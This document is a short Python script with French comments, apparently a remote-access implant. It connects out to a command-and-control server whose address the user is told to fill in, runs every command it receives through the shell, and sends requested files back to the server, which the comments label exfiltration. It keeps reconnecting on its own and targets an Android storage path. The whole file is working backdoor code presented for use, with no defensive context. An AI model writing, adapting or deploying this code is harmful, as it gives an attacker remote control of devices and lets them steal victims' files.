import socket
import subprocess
import os
import time

# --- CONFIGURATION ---
SERVER_IP = "127.0.0.1"  # À remplacer par l'IP de votre serveur C2
PORT = 8080
WORKING_DIR = "/storage/emulated/0/hack"

def executer_commande(commande):
    """Exécute une commande système et retourne le résultat."""
    try:
        return subprocess.check_output(commande, shell=True, stderr=subprocess.STDOUT)
    except Exception as e:
        return str(e).encode()

def envoyer_fichier(s, nom_fichier):
    """Lit un fichier et l'envoie par blocs binaires."""
    if os.path.exists(nom_fichier):
        with open(nom_fichier, "rb") as f:
            while True:
                octets = f.read(4096)
                if not octets:
                    break
                s.send(octets)
        time.sleep(1) # Pause pour s'assurer que le buffer est vide
        s.send(b"TRANSFERT_TERMINE")
    else:
        s.send(b"Erreur : Fichier introuvable.")

def main():
    # On s'assure d'être dans le bon dossier
    if os.path.exists(WORKING_DIR):
        os.chdir(WORKING_DIR)

    while True: # Boucle de reconnexion automatique
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, PORT))
            
            while True:
                donnees = s.recv(1024).decode().strip()
                
                if not donnees:
                    break
                
                if donnees.lower() == "quitter":
                    s.close()
                    return

                # Logique d'exfiltration
                if donnees.startswith("download"):
                    nom_f = donnees.split(" ")[1]
                    envoyer_fichier(s, nom_f)
                
                # Logique d'exécution de commande
                else:
                    resultat = executer_commande(donnees)
                    s.send(resultat if resultat else b"Commande executee sans retour.")
                    
        except Exception:
            # En cas d'erreur ou de coupure, on attend 5s avant de retenter
            time.sleep(5)
            continue

if __name__ == "__main__":
    main()
